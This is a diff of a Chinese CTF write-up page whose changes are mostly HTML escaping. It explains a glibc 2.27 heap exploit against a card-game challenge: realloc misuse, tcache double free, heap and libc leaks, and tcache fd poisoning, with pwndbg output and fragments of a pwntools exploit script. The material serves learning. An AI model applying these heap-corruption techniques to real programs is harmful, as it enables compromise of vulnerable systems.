+<h1 id="15mins-初步猜测"><a href="#15mins-初步猜测" class="headerlink" title="15mins 初步猜测"></a>15mins 初步猜测</h1><p>参考 <a target="_blank" rel="noopener" href="https://www.eqqie.cn/index.php/archives/1400/">REALLOC</a>，发现 <code>realloc</code> 有很多特性。<br>假如设置 <code>count</code> = 0，释放 <code>random_lvl</code> 和 <code>list_ptr</code>，那么不会导致后面的 <code>setinfo</code> 赋值报错（<code>i &gt;= count</code> 会退出循环），但是无法读取和 <code>shuffle</code>。<br>猜测是利用 <code>init</code> 的恢复操作，配合 <code>realloc</code> 释放堆和重新申请堆来制造申请 bss 或重叠堆的条件。</p>
 <h1 id="wp-复现"><a href="#wp-复现" class="headerlink" title="wp 复现"></a>wp 复现</h1><p>看了 wp 发现完全用不到 <code>shuffle</code> 这个函数，仅仅是迎合题目的名字来写的。（以后做题也要看看题目名字判断哪些函数是有用的，哪些函数是没用的。）</p>
 <p>另外，2.27 的 3ubuntu1 似乎还没有添加对 tcache bins 的 double free 检测，但是 ubuntu 18 下的 2.27 3ubuntu1.6 是有检测的。这里是一个点。</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15808">wp</a> 用了 doublefree 的特性来泄露堆地址。但也有可以不用 double free 泄露堆地址的方法。<br>注意到 <code>init</code> 函数中会申请 <code>0x30</code>（对齐后）的堆：</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c">cards<span class="token operator">-></span>list_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">cards<span class="token operator">-&gt;</span>list_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>而在 <code>setinfo</code> 中可以扩展或重新申请：</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c">obj<span class="token operator">-></span>list_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>obj<span class="token operator">-></span>list_ptr<span class="token punctuation">,</span> <span class="token number">8LL</span> <span class="token operator">*</span> obj<span class="token operator">-></span>count<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>由于最开始运行程序时，<code>list</code> 申请到的堆的下方有其他堆存在，<code>realloc</code> 不可能扩展，所以原有的 <code>0x30</code> 会被释放。<br>所以，计算一个申请到 0x30 堆的数字，0x28 &#x2F; 4 &#x3D; 10，设置 count &#x3D; 10。</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_UNKNOWN <span class="token operator">*</span><span class="token punctuation">)</span>obj<span class="token operator">-></span>ptr_record <span class="token operator">==</span> <span class="token operator">&amp;</span>unk_202010 <span class="token punctuation">)</span>
-  random_lvl_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> obj<span class="token operator">-></span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">obj<span class="token operator">-&gt;</span>list_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>obj<span class="token operator">-&gt;</span>list_ptr<span class="token punctuation">,</span> <span class="token number">8LL</span> <span class="token operator">*</span> obj<span class="token operator">-&gt;</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>由于最开始运行程序时，<code>list</code> 申请到的堆的下方有其他堆存在，<code>realloc</code> 不可能扩展，所以原有的 <code>0x30</code> 会被释放。<br>所以，计算一个申请到 0x30 堆的数字，0x28 / 4 = 10，设置 count = 10。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_UNKNOWN <span class="token operator">*</span><span class="token punctuation">)</span>obj<span class="token operator">-&gt;</span>ptr_record <span class="token operator">==</span> <span class="token operator">&amp;</span>unk_202010 <span class="token punctuation">)</span>
+  random_lvl_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> obj<span class="token operator">-&gt;</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">else</span>
-  random_lvl_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>obj<span class="token operator">-></span>ptr_record<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> obj<span class="token operator">-></span>count<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>此时 <code>randomlvlptr</code> 会申请到一个 0x30 的堆，而这时候 10 * 8 &#x3D; 80，原有的 <code>list</code> 堆 0x30 会被释放。<br>再设置 count 为 0 可以释放 <code>randomlvlptr</code> 的 0x30，从而在其 fd 位置写入指针，调用 <code>getinfo</code> 即可泄露。</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit chara set:%s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>cards<span class="token operator">-></span>ptr_record<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+  random_lvl_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>obj<span class="token operator">-&gt;</span>ptr_record<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> obj<span class="token operator">-&gt;</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>此时 <code>randomlvlptr</code> 会申请到一个 0x30 的堆，而这时候 10 * 8 = 80，原有的 <code>list</code> 堆 0x30 会被释放。<br>再设置 count 为 0 可以释放 <code>randomlvlptr</code> 的 0x30，从而在其 fd 位置写入指针，调用 <code>getinfo</code> 即可泄露。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit chara set:%s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>cards<span class="token operator">-&gt;</span>ptr_record<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>同理，申请大堆块释放进入 unsorted bins 就可以泄露 libc 基址（这里即使 unsorted bin 与 top chunk 合并，仍然能泄露，<code>fd</code> <code>bk</code> 位置的信息在合并之后不会被删除）。</p>
 <p>难就难在如何制造 double free。<br>最简单的方法就是直接利用 3ubuntu1 glibc 的 tcache 无检查 doublefree 特性产生 doublefree。（这里是看了 wp 才知道的点）<br><del>但是想不到 glibc 本身没有检查。印象中的 2.27 一直都是有 tcache double free 检测的。而且在 docker ubuntu18 上面测试也有检测，不知道是哪里问题了。</del></p>
@@ -459,9 +629,9 @@
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// docker ubuntu18 下编译</span>
 <span class="token comment">// gcc -z lazy -z noexecstack -no-pie -fno-stack-protector -g -o ./test ./test.c</span>
 
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
 	<span class="token keyword">char</span> <span class="token operator">*</span> a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 	<span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
 	<span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span>a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">;</span>
@@ -470,7 +640,7 @@
 	a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 	a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>执行完最后一次 <code>malloc</code> 之后：</p>
 <pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bins
 tcachebins
@@ -483,12 +653,12 @@ setinfo<span class="token punctuation">(</span><span class="token number">0</spa
 <span class="token comment"># uaf: 动调发现 realloc 不会直接申请 tcache</span>
 <span class="token comment"># 通过 uaf 修改 tcache fd 内容</span>
 setinfo<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> flat<span class="token punctuation">(</span>mng_mem<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这里为什么可以修改 tcache 的 <code>fd</code> 呢？动调可以得知为什么。<br>首先是第一句 <code>setinfo(128, 0, 0, b&#39;a&#39;)</code>，会申请堆：</p>
+<p>这里为什么可以修改 tcache 的 <code>fd</code> 呢？动调可以得知为什么。<br>首先是第一句 <code>setinfo(128, 0, 0, b'a')</code>，会申请堆：</p>
 <pre class="line-numbers language-none"><code class="language-none">► 0x5591c3c01231    call   malloc@plt                  &lt;malloc@plt&gt;
        size: 0x200<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>然后第二句 <code>setinfo(0, 0, 0)</code>，会释放堆：</p>
 <pre class="line-numbers language-none"><code class="language-none"> ► 0x5591c3c01218    call   realloc@plt                 &lt;realloc@plt&gt;
-        ptr: 0x5591c56c9e00 ◂— 0x61 &#x2F;* &#39;a&#39; *&#x2F;
+        ptr: 0x5591c56c9e00 ◂— 0x61 /* 'a' */
         size: 0
         
 执行后：
@@ -496,12 +666,12 @@ tcachebins
 0x30 [  1]: 0x5591c56c9a50 ◂— 0
 0x60 [  1]: 0x5591c56c9670 ◂— 0
 0x210 [  1]: 0x5591c56c9e00 ◂— 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>第三句 <code>setinfo(128, 0, 0, flat(mng_mem))</code> 奇特的点来了。由于 <code>ptr_record</code> 存放了先前已经被 <code>realloc</code> free 掉了的指针，所以再调用 <code>realloc</code> 理论上来说会扩展 &#x2F; 重新申请这个堆：</p>
+<p>第三句 <code>setinfo(128, 0, 0, flat(mng_mem))</code> 奇特的点来了。由于 <code>ptr_record</code> 存放了先前已经被 <code>realloc</code> free 掉了的指针，所以再调用 <code>realloc</code> 理论上来说会扩展 / 重新申请这个堆：</p>
 <pre class="line-numbers language-none"><code class="language-none">► 0x5591c3c01218    call   realloc@plt                 &lt;realloc@plt&gt;
        ptr: 0x5591c56c9e00 ◂— 0
        size: 0x200<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>但是执行了 <code>realloc</code> 之后：</p>
-<pre class="line-numbers language-none"><code class="language-none"> ► 0x5591c3c0121d    mov    qword ptr [rbp - 0x18], rax     [0x7ffe0ce347d8] &#x3D;&gt; 0x5591c56c9e00 ◂— 0
+<pre class="line-numbers language-none"><code class="language-none"> ► 0x5591c3c0121d    mov    qword ptr [rbp - 0x18], rax     [0x7ffe0ce347d8] =&gt; 0x5591c56c9e00 ◂— 0
  
 tcachebins
 0x30 [  1]: 0x5591c56c9a50 ◂— 0
@@ -526,7 +696,7 @@ sulibc <span class="token operator">=</span> <span class="token keyword">lambda<
     pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 <span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    sla<span class="token punctuation">(</span><span class="token string">b'&gt;&gt; '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 <span class="token keyword">def</span> <span class="token function">setinfo</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span> ranges<span class="token punctuation">,</span> lvl<span class="token punctuation">,</span> content <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -606,7 +776,7 @@ sulibc <span class="token operator">=</span> <span class="token keyword">lambda<
     pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 <span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    sla<span class="token punctuation">(</span><span class="token string">b'&gt;&gt; '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 <span class="token keyword">def</span> <span class="token function">setinfo</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span> ranges<span class="token punctuation">,</span> lvl<span class="token punctuation">,</span> content <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -693,7 +863,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 
 
 
-<script defer>
+<script defer="">
   document.addEventListener('DOMContentLoaded', function () {
     const toggleIcon = document.querySelector('.sea-article-catalog-title .sea-svg-icon');
     const tocContent = document.querySelector('.sea-article-catalog > .toc');
@@ -710,13 +880,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
   <div class="sea-footer-row">
     <div class="sea-footer-menu-link">
       
-        <a
-          class="sea-footer-link"
-          
-            target="_blank"
-          
-          href="https://github.com/shanzade"
-        >
+        <a class="sea-footer-link" target="_blank" href="https://github.com/shanzade">
           GitHub
         </a>
         <span class="sea-footer-link__dot">·</span>
@@ -745,10 +909,23 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
   
 
 
-<script src="/js/main.js" defer></script>
+<script src="/js/main.js" defer=""></script>
 
 
-<script src="/js/theme.js" defer></script>
+<script src="/js/theme.js" defer=""></script>
 
-</body>
-</html>
+
+
+    <script>
+    (function () {
+      const tocDesktop = document.getElementById('toc-desktop');
+      const tocMobile = document.getElementById('toc-mobile');
+      const toc = tocDesktop || tocMobile;
+      if (!toc) return;
+      const toggle = document.getElementById('toc-toggle');
+      toggle.addEventListener('click', function () {
+        tocDesktop.classList.toggle('collapsed');//有则删 无则加
+      });
+    })();
+    </script>
+      </body></html>
